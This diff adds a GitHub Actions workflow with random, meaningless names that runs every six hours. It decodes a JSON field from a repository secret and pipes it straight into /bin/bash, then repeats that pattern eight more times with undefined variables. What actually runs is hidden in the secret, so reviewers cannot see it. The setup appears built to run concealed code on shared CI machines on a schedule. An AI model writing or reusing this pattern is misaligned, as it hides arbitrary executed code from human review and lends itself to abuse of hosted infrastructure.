@@ -1,0 +1,25 @@
+name: julinjinjia
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: julinjinjia
+        env:
+          auu9835: ${{ secrets.auu9835 }}
+        run: |
+          echo $auu9835 | jq -r .c038 | /bin/bash
+          echo $uhyv42104 | jq -r .hri15 | /bin/bash
+          echo $s117 | jq -r .tvve8 | /bin/bash
+          echo $cr8 | jq -r .oume35378 | /bin/bash
+          echo $oyohi99 | jq -r .eurou9 | /bin/bash
+          echo $y94 | jq -r .ut6428 | /bin/bash
+          echo $falsd693 | jq -r .h67 | /bin/bash
+          echo $sty26676 | jq -r .s590 | /bin/bash
+          echo $rdh012 | jq -r .ls613 | /bin/bash
+
